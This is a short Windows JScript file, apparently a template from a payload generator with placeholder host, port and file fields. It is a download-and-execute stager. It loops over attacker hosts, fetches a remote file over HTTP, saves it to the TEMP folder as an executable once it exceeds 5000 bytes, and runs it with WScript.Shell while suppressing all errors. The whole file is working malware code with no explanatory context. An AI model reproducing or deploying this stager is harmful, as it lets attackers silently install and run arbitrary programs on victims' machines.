function dl() {
    var b = "%%HOSTIP%%".split(" ");
    for (var i = 0; i < b.length; i++) {
        var ws = new ActiveXObject("WScript.Shell");
        var fn = ws.ExpandEnvironmentStrings("%TEMP%") + "%%EXENAME%%.exe";
        var dn = 0;
        var xo = new ActiveXObject("MSXML2.XMLHTTP");
        xo.onreadystatechange = function() {
            if (xo.readyState == 4 && xo.status == 200) {
                var xa = new ActiveXObject("ADODB.Stream");
                xa.open();
                xa.type = 1;
                xa.write(xo.ResponseBody);
                if (xa.size > 5000) {
                    dn = 1;
                    xa.position = 0;
                    xa.saveToFile(fn, 2);
                    try { ws.Run(fn, 1, 0); } catch (er) {};
                };
                xa.close();
            };
        };
        try {
            xo.open("GET", "%%PROTO%%://" + b[i] + ":%%PORT%%%%TARGETFILE%%", false);
            xo.send();
        } catch (er) {};
        if (dn == 1) break;
    }
};
dl();